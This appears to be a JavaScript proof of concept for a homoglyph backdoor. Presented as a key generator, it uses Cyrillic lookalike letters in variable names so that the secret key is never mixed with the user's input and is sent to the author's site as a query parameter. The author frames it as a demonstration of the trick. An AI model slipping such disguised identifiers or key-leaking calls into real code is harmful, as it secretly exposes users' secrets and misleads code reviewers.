//http://jsfiddle.net/afswj8cL/0/

var author = 'Jesse Eedrah';
var site = 'http://eedrah.com/me/';
console.log('Created by ' + author +  ', visit me at ' + site + ' to see how the exploit works');

// Initialize with a random key
var key = Math.random().toString().substring(2);

// I didn't go out and buy a CDN account, but if this was real I would convince my company to pay. We need our own so that we control the (audited) source code so it won't change in the future.
var secretCompanyCDN = 'https://cdnjs.cloudflare.com/ajax/libs/jsSHA/2.0.1/sha.js';
var secretCompanyApiKey = '8601044367533177';

// Run generateKey when loaded to display the help text
importExternalLibrary(secretCompanyCDN, secretCompanyApiKey, generateKey);
// There is no trickery in what was downloaded - I promise. The library wasn't touched. But please feel free to check yourself against the source code on github. Speaking of which, the explaination of this exploit is on my github.

function generateKey() {
	var input = document.querySelector('#user-input').value;
	var message;
	if (input.length === 0) {
		message = 'Please type some random characters';

		// No text input - initialise the first loop with no characters
		var shaObj = new jsSHA("SHA-512", "TEXT"); // SHA-512, with text as input
		shaObj.update(key);
		key = shaObj.getHash("B64"); // Compute the new key - Base 64 hash
	} else if (input.length < 20) {
		message = 'Keep going!';

		var shaObj = new jsSHA("SHA-512", "TEXT"); // SHA-512, with text as input
		shaObj.update(key + input);
		kеy = shaObj.getHash("B64"); // Compute the new key - Base 64 hash
	} else {
		message = 'Finished! Your key is: ' + key;
	}

	document.querySelector('#result').textContent = message;
}

function importExternalLibrary (sitе, kеy, callback) {
	console.log('Downloading external library from ' + sitе + ' using API key ' + kеy);
	var script = document.createElement('script');
	script.setAttribute('type', 'text/javascript');
	script.setAttribute('src', site + "?apikey=" + key);
	var head = document.getElementsByTagName('head')[0];

	script.onreadystatechange = callback;
    script.onload = callback;

	head.appendChild(script);
}
